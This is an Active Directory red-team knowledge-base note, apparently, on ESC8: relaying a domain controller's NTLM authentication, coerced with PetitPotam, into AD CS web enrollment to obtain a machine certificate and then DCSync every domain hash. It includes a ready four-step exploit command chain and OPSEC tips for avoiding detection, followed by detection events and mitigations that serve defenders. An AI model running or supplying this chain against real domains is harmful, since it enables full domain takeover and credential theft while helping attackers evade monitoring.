---
title: "ESC8 — NTLM relay to AD CS web enrollment (PetitPotam → DCSync)"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [active-directory, ad-cs, esc, ntlm, relay, coercion, dcsync]
---

# ESC8

**NTLM relay to AD CS.** AD CS Web Enrollment (`/certsrv/`, `certfnsh.asp`
et al.) commonly accepts **NTLM without EPA** over plain HTTP. Relay a
**coerced** NTLM authentication (usually the DC's own machine account, forced
via [[printer-bug]] / EFSRPC — see [[ntlm-relay-coercion]]) into that endpoint
and the CA mints you a certificate **for the coerced account** — a
`DomainController`/`Machine` template cert for the DC is worth **DCSync**,
i.e. every hash in the domain including `krbtgt`.

## The condition

- CA web interface reachable over **HTTP** and accepts **NTLM** (no EPA, or
  EPA not enforced on that interface).
- A **machine-usable template** (`Machine`, `DomainController`, or a
  user-enrollable template with the right EKUs) is available to the coerced
  account.
- A coercion vector into the relay: Print Spooler (default < Win11/Server 2022
  hardening) or EFSRPC on a DC — see [[printer-bug]].

## Exploit

```bash
# 1. listener pointed at the CA web endpoint, ADCS mode
impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp --adcs \
  --template DomainController
# or: certipy relay -target "http://<CA_IP>/certsrv/certfnsh.asp" -template DomainController

# 2. coerce the DC to authenticate to your relay
python3 PetitPotam.py <attacker_ip> <dc_ip>

# 3. listener drops a base64 PFX for the DC's machine account; turn it into a TGT
certipy auth -pfx dc.pfx -dc-ip <DC_IP> -username <DC_NAME>$ -domain <DOMAIN>

# 4. DCSync
impacket-secretsdump -hashes :<DC_NT_HASH> '<DOMAIN>/<DC_NAME>$@<DC_IP>'
```

Full end-to-end walkthrough (recon with `certipy find -vulnerable`, failure
modes, cleanup) in [[esc8-ntlm-relay-adcs]]. The RPC-ICPR variant is
**[[esc11]]-style** (no web enrollment needed, `IF_ENFORCEENCRYPTICERTREQUEST`
off).

## Red-team notes (OPSEC)

- **Confirm the endpoint accepts NTLM before coercing** — one coercion into a
  Kerberos-only/EPA endpoint wastes the cleanest noise event you have.
  `certipy find` flags ESC8 from LDAP passively.
- **Coerce exactly one DC, once.** The 4624/4625 + SMB/RPC burst from the DC
  to your IP is the headline detection; repeat coercion is the headline
  *pattern*.
- **The cert is the payload, not the shell** — you can stop at
  `certipy auth` (PKINIT TGT) or UnPAC the DC's NT hash
  ([[pkinit-unpac-the-hash]]) and DCSync from your own box; nothing needs to
  run on the CA or DC.
- **Runs entirely from Linux over the tunnel** — `ntlmrelayx`/`certipy`
  locally, coercion over SMB/RPC to the DC.

## Detection

- **Relay tells** — see [[ntlm-relay-coercion]] (4624 Type 3 NTLM from the DC
  to an unusual host, 4625 bursts, RPC/SMB connection to your IP).
- **CA-side** — **4886/4887** (request/issue) for a `Machine`/
  `DomainController` template with **requester ≠ expected enrollee pattern**
  (a DC enrolling a cert for itself from a non-standard source); CA event log
  is the highest-fidelity record of the issuance.
- **Kerberos-side** — a **4768** for `<DC_NAME>$` using **PKINIT** (cert
  pre-auth) that doesn't match the DC's normal logon profile.
- BloodHound/ACL view doesn't show this path — it's a *network-position*
  attack, so network telemetry + CA logs are the detectors.

## Mitigations

- **HTTPS + EPA** on `/certsrv/` (the standard fix; kills relay).
- **Disable NTLM** on the AD CS web interface (Kerberos only).
- **RPC filters** on DCs — block MS-RPRN (Spooler) / MS-EFSRPC inbound;
  uninstall Print Spooler where Tiering allows ([[printer-bug]]).
- **Uninstall Web Enrollment** if unused.
- Alert on 4886/4887 for machine templates + 4768 PKINIT for machine accounts.

## Links

- [[ad-cs-esc-attacks]] — ESC8 in the family; the RPC variant is ESC11
- [[esc8-ntlm-relay-adcs]] — the full chain walkthrough (source page)
- [[ntlm-relay-coercion]], [[printer-bug]] — the coercion that feeds it
- [[dcsync]] — the endgame the DC cert buys
- [[ntlmrelayx]], [[petitpotam]], [[certipy]] — the tooling
- [[path-esc8-petitpotam-to-dcsync]] — the end-to-end attack-path note
- [[mitm6-ipv6-relay]] — the credential-less alternative when you don't want to coerce
